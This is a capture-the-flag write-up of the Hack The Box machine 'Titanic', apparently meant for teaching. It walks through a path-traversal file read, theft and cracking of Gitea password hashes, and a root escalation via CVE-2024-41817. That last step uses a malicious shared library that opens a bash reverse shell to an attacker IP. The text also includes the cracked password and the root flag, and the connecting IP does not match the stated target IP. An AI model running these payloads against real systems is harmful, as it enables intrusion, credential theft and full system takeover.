# Titanic — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP** | `10.129.231.221` |
| **Author** | ruycr4ft |

## Synopsis

Titanic is an easy Linux machine running an **Apache**-fronted **Flask** application that lets
visitors book a trip. The booking flow's download endpoint is vulnerable to **Arbitrary File
Read** via a `ticket` parameter. Fuzzing for virtual hosts uncovers a **Gitea** instance
(`dev.titanic.htb`) whose public repositories leak the container layout of the production app,
including the on-disk path of Gitea's own SQLite database. Combining both bugs, the database is
exfiltrated through the file-read flaw, its `user` table dumped, and the `developer` account's
PBKDF2 hash cracked offline, granting SSH access. On the box, a root-owned cron script calls a
vulnerable **ImageMagick 7.1.1-35** (`magick identify`) over a directory the `developer` user can
write to, which is exploitable via **CVE-2024-41817** (arbitrary code execution through a
malicious shared library) to get a reverse shell as `root`.

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate=5000 -T4 10.129.231.221
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Port 80 redirects to the `titanic.htb` vHost, added to `/etc/hosts`.

### Apache / Flask — the booking form

The site advertises the Titanic and offers a "Book Your Trip" form. Submitting it triggers a
`POST /book` followed by a `GET /download?ticket=<file>.json`, which downloads the generated
booking confirmation. Intercepting the flow in Burp Suite shows that the `ticket` parameter is
just a file path handed straight to the download handler — a strong hint of **path traversal /
Arbitrary File Read**:

```
GET /download?ticket=11ac12b7-ab82-4299-90cb-d1b28002121e.json HTTP/1.1
Host: titanic.htb
```

Swapping the value for an absolute path confirms the bug:

```
GET /download?ticket=/etc/passwd HTTP/1.1
```

The response returns the contents of `/etc/passwd`, revealing a local user called `developer`.

### Virtual host fuzzing — Gitea

```bash
gobuster vhost -u http://titanic.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -r
```

This uncovers `dev.titanic.htb`, added to `/etc/hosts`, which hosts a **Gitea** instance that
allows self-registration. After registering a throwaway account, two public repositories owned
by `developer` are visible: `flask-app` and `docker-config`.

- **`flask-app`** — the source of the site on port 80. `app.py` confirms the `/download`
  endpoint reads whatever path is passed in `ticket` with no sanitisation — the Arbitrary File
  Read bug found earlier.
- **`docker-config`** — two `docker-compose.yml` files (Gitea and MySQL). The Gitea one mounts
  `/home/developer/gitea/data` as the container's `/data` volume, which is where Gitea keeps its
  SQLite database.

---

## Foothold

### Grabbing the Gitea database through the LFI

Standing up a local Gitea container with the same compose file confirms the database ends up at
`<volume>/gitea/gitea.db`, so on the target it should live at
`/home/developer/gitea/data/gitea/gitea.db`. Pulling it through the file-read bug:

```bash
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```

### Dumping credentials

```bash
sqlite3 gitea.db "SELECT name, passwd_hash_algo, salt, passwd FROM user"
```

| name | passwd_hash_algo | salt | passwd |
|---|---|---|---|
| administrator | pbkdf2$50000$50 | `2d149e5f...` | `cba20ccf...` |
| developer | pbkdf2$50000$50 | `8bf3e345...` | `e531d398...` |

Gitea's PBKDF2 hash format packs `salt` and `passwd` as base64 for Hashcat mode `10900`:

```bash
echo "8bf3e3452b78544f8bee9400d6936d34" | base64
echo "e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56" | base64
```

```
sha256:50000:<salt_b64>:<hash_b64>
```

### Cracking the hash

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 10900 hash.txt --show
```

The `developer` password cracks quickly against rockyou: **`25282528`**.

### SSH access

```bash
ssh developer@titanic.htb
```

The **user flag** sits in `/home/developer/`.

---

## Privilege Escalation — ImageMagick (CVE-2024-41817)

`ps aux` on the box shows the two services actually running under `developer`:

```
develop+  1103  ... /usr/bin/python3 /opt/app/app.py
develop+  1734  ... /usr/local/bin/gitea web
```

Enumerating `/opt` reveals `/opt/app` (group-owned by `developer`) and `/opt/scripts`, which
holds `identify_images.sh` — a script, scheduled every minute, that runs:

```bash
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

`developer` has write access to `/opt/app/static/assets/images` (`drwxrwx---` group `developer`),
and the `magick` binary running against that folder is `ImageMagick 7.1.1-35`:

```bash
magick --version
```

That version is vulnerable to **CVE-2024-41817** — ImageMagick resolves certain delegate shared
libraries (e.g. `libxcb.so.1`) relative to its working directory, so a malicious `.so` dropped
next to the images gets loaded and executed as whichever user invokes `magick`. Since the cron
job runs as `root`, this gives arbitrary code execution as root.

### Building the malicious library

```bash
cd /opt/app/static/assets/images
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/10.10.15.0/4444 0>&1'");
    exit(0);
}
EOF
```

The `constructor` attribute makes `init()` run as soon as the shared library is loaded — i.e. the
moment root's scheduled `magick identify` call picks it up.

### Catching the shell

```bash
nc -lvnp 4444
```

Within a minute, the cron-triggered `magick identify` loads `libxcb.so.1` and a **root** shell
connects back:

```
connect to [10.10.15.0] from (UNKNOWN) [10.10.11.55] 52698
root@titanic:/opt/app/static/assets/images# cd /root
root@titanic:~# cat root.txt
590cd50b51d4f57643c4d0d7f2c58a81
```

**Root flag:** `590cd50b51d4f57643c4d0d7f2c58a81`
